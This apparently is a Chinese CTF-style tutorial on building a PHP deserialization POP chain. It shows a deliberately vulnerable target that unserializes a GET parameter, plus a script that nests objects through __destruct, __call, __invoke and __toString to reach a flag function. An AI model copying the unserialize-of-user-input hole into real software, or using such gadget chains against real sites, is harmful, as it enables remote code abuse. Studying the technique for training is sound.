[TOC]



# ==PHP反序列化漏洞POP调用链构造二==

## 一、PHP目标代码

```PHP
<?php

class start_gg{
    public $mod1;
    public $mod2;
    public function __destruct()
    {
        $this->mod1->test1();
    }
}
class Call{
    public $mod1;
    public $mod2;
    public function test1() {
        $this->mod1->test2();
    }
}
class funct{
    public $mod1;
    public $mod2;
    public function __call($name, $arguments)
    {
        $s1 = $this->mod1;
        $s1();
    }
}
class func{
    public $mod1;
    public $mod2;
    public function __invoke()
    {
        $this->mod2 = "hello".$this->mod1;
    }
}
class string1{
    public $str1;
    public $str2;
    public function __toString()
    {
        $this->str1->get_flag();
        return "1";
    }
}
class GetFlag{
    public function get_flag() {
        echo "flag:xxxxxxxxxxxxxxxxxxxxxxxxxxxx";
    }
}
$a = $_GET['string'];
unserialize($a);

?>
```

## 二、POP调用链分析

```php
<?php
class GetFlag{
    public function get_flag() {
        echo "flag:xxxxxxxxxxxxxxxxxxxxxxxxxxxx";
    }
}
class string1{
    public $str1;
    function __construct()
    {
        $this->str1 = new GetFlag();
    }
}

class func{
    public $mod1;
    function __construct()
    {
        $this->mod1 = new string1();
    }
}
class funct{
    public $mod1;
    function __construct()
    {
        $this->mod1 = new func();
    }
}

class start_gg{
    public $mod1;
    function __construct()
    {
        $this->mod1 = new funct();
    }
}

$a = new start_gg();
echo serialize($a);
    
?>
```

![image-20240827231635678](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827231635678.png)

![image-20240827231648880](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827231648880.png)